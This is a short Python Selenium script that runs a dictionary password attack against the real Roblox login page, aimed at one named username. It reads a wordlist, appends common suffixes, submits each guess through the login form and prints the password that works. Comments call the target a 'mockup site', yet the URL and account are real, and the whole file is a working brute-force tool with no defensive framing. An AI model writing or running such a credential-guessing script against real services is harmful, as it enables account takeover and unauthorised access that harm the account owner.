import random
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

url = 'https://www.roblox.com/Login'  # Replace with your mockup site's login URL
username = 'theblizzard123'

driver = webdriver.Chrome()

# Load the wordlist
with open(r'wordlist.txt', 'r') as file:
    wordlist = file.read().splitlines()  # Read passwords line by line

# Optionally, add variations (e.g., append numbers or symbols)
variations = ['123', '!', '2023']
passwords = [word + variation for word in wordlist for variation in variations]
passwords.extend(wordlist)  # Include the original words as well

# Loop through the dictionary passwords
for password in passwords:
    driver.get(url)
    
    # Wait for input fields and button to load
    wait = WebDriverWait(driver, 10)
    username_input = wait.until(EC.presence_of_element_located((By.ID, 'login-username')))
    password_input = wait.until(EC.presence_of_element_located((By.ID, 'login-password')))
    submit_button = wait.until(EC.element_to_be_clickable((By.XPATH, '//button[@type="button" and @id="login-button" and contains(@class, "btn-secondary-md")]')))
    
    # Fill in the login form
    username_input.send_keys(username)
    password_input.send_keys(password)
    submit_button.click()
    
    # Check for successful login
    if 'Welcome' in driver.page_source:  # Adjust this condition to match your mockup site's success indicator
        print(f'Correct password for {username}: {password}')
        break
    else:
        print(f'Attempted password: {password}')
